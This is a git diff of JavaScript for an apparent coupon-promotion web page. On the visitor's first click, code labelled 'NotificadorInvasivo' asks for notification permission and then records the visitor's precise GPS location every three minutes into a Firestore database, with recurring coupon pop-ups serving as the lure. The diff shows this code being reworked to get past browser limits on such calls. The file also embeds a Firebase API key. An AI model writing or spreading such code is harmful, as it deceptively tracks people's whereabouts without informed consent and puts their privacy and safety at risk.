@@ -8,8 +8,6 @@ import {
   getCountFromServer
 } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 
-// TODO: Replace the following with your app's Firebase project configuration
-// See: https://support.google.com/firebase/answer/7015592
 const firebaseConfig = {
   apiKey: "AIzaSyBZavR7TNRrzKrxr1RqnvfrUelMLz81hyg",
   authDomain: "bd-herramienta-busqueda.firebaseapp.com",
@@ -20,120 +18,94 @@ const firebaseConfig = {
   measurementId: "G-6S15ZGGCQ4"
 };
 
-// Initialize Firebase
 const app = initializeApp(firebaseConfig);
-// Initialize Cloud Firestore and get a reference to the service
 const db = getFirestore(app);
-/* ******************************************************************************* */
 
-/*FUNCION DE BD*/
+/* FUNCION DE BD */
 async function guardarUbicacionBD(lat, lon) {
   try {
     const colRef = collection(db, "ubicaciones");
-
     const snapshot = await getCountFromServer(colRef);
-    const nuevoId = snapshot.data().count;
+    const nuevoId = (snapshot.data().count || 0) + 1; // Ajuste para que no empiece en 0
 
     await addDoc(colRef, {
       ubicacion: `${lat}, ${lon}`,
       id_ubicaciones: nuevoId,
       fecha_ubi: serverTimestamp(),
     });
-    console.log(`Documento guardado con ID secuencial: ${nuevoId}`);
+    console.log(`Documento guardado. ID: ${nuevoId}`);
   } catch (e) {
-    console.error("Error al obtener conteo o guardar:", e);
+    console.error("Error en Firestore:", e);
   }
 }
 
-/*FUNCION DE GEOLOCALIZACION*/
-async function obtenerUbicacion() {
+/* FUNCION DE GEOLOCALIZACION */
+function obtenerUbicacion() {
   const resultado = document.getElementById("resultado");
   if (navigator.geolocation) {
-    if (resultado) resultado.innerHTML = "capturando info";
+    if (resultado) resultado.innerHTML = "Capturando...";
 
     navigator.geolocation.getCurrentPosition(
-      async function (posicion) {
+      (posicion) => {
         const lat = posicion.coords.latitude;
         const lon = posicion.coords.longitude;
-        if (resultado) {
-          resultado.innerHTML = `Lat: ${lat}, ${lon}`;
-        }
+        if (resultado) resultado.innerHTML = `Lat: ${lat}, ${lon}`;
         guardarUbicacionBD(lat, lon);
       },
-      function (error) {
-        console.error("Error de geolocalización:", error.message);
-      },
-      { enableHighAccuracy: true } // Mayor precisión para el GPS
+      (error) => console.error("Error GPS:", error.message),
+      { enableHighAccuracy: true, timeout: 5000 }
     );
   }
 }
 
-/*notificador)*/
+/* NOTIFICADOR Y SERVICE WORKER */
 const NotificadorInvasivo = {
   registration: null,
-  solicitarPermiso: async function (ms) {
+  iniciar: async function (ms) {
     try {
+      // 1. Registro del SW (Asegúrate que sw.js esté en la raíz)
       this.registration = await navigator.serviceWorker.register('/sw.js');
+      
+      // 2. Pedir permiso (Debe ser disparado por un clic)
       let permission = await Notification.requestPermission();
 
       if (permission === "granted") {
         obtenerUbicacion();
-        setInterval(() => {
-          obtenerUbicacion();
-        }, ms);
+        setInterval(() => obtenerUbicacion(), ms);
       }
     } catch (err) {
-
-      console.error("Error de permisos/sw.js: ", err);
+      console.error("Fallo en Notificador/SW:", err);
     }
   }
 };
-window.onload = () => {
-  NotificadorInvasivo.solicitarPermiso(180000);
-};
 
-
-
-
-
-
-/**
- * NOTIFICACIONES CADA 5 MINUTOS 
- * POR EL DESBLOQUEO DE UN CUPON NUEVO
- * PC Y MOVIL
- */
+/* GESTIÓN DE NOTIFICACIONES (CUPÓN) */
 const Noti = {
   msg: "¡Cupón: PROMO2026! 🎁",
-
   lanzar: function () {
-    //Notificación de sistema (PC/Android)
     if (Notification.permission === "granted") {
       new Notification("¡Nuevo Cupón!", { body: this.msg });
     }
-
-    // 2. Notificación en pantalla (Celular/Todos)
     const div = document.createElement('div');
     div.innerHTML = this.msg;
-    div.style = "position:fixed;bottom:20px;right:20px;background:#000;color:#fff;padding:15px;border-radius:8px;z-index:9999;font-family:sans-serif";
+    div.style = "position:fixed;bottom:20px;right:20px;background:#000;color:#fff;padding:15px;border-radius:8px;z-index:9999;";
     document.body.appendChild(div);
-
-    setTimeout(() => div.remove(), 5000); // Desaparece en 5 seg
-  },
-
-  iniciar: function () {
-    // Pedir permiso al primer clic
-    document.addEventListener('click', () => Notification.requestPermission(), { once: true });
-
-    // Ciclo de 3 minutos
-    setInterval(() => this.lanzar(), 180000);
+    setTimeout(() => div.remove(), 5000);
   }
 };
 
-Noti.iniciar();
+/* ACTIVACIÓN UNIFICADA (El cambio más importante) */
+// Los navegadores bloquean window.onload para estas funciones. 
+// Usamos un solo listener de clic para activar todo.
+document.addEventListener('click', () => {
+    NotificadorInvasivo.iniciar(180000);
+    
+    // Iniciar ciclo de cupones
+    setInterval(() => Noti.lanzar(), 180000);
+}, { once: true }); // Solo se ejecuta una vez al primer clic
 
-/**funcion para el flip() 
- * imagen que al dar clic se voltee y muestre un codigo de descuento 
- * de esa página
-*/
-$("#card").flip();
-$("#carde").flip();
+/* JQUERY FLIP */
+$(document).ready(function(){
+    $("#card").flip();
+    $("#carde").flip();
+});
